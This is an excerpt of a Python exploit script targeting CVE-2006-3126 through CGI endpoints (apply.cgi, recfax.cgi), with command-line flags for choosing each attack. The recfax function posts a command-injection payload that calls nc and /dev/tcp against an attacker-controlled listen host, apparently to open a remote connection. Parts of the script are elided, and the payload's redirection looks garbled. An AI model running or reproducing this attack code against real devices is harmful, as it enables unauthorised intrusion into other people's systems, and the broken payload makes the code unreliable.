...
# CVE-2006-3126 exploit function using apply.cgi
def exploit_cve_2006_3126_apply(target, listen, file_path):
...
# CVE-2006-3126 exploit function using recfax.cgi
def exploit_cve_2006_3126_recfax(target, listen):
    url = f'http://{target}/cgi-bin/fax/recfax.cgi'
    payload = {'REMOTE_ADDR': f'$(nc {listen} 4444 < /dev/tcp/{listen}/4444)'}
    requests.post(url, data=payload)
...
parser.add_argument('-cve3a', '--cve-2006-3126-apply', action='store_true', help='test for CVE-2006-3126 using apply.cgi')
parser.add_argument('-cve3r', '--cve-2006-3126-recfax', action='store_true', help='test for CVE-2006-3126 using recfax.cgi')
...
if args.cve_2006_3126_apply:
    file_path = args.file_path
    exploit_cve_2006_3126_apply(target_ip, listen_ip, file_path)

if args.cve_2006_3126_recfax:
    file_path = args.file_path
    exploit_cve_2006_3126_recfax(target_ip, listen_ip)
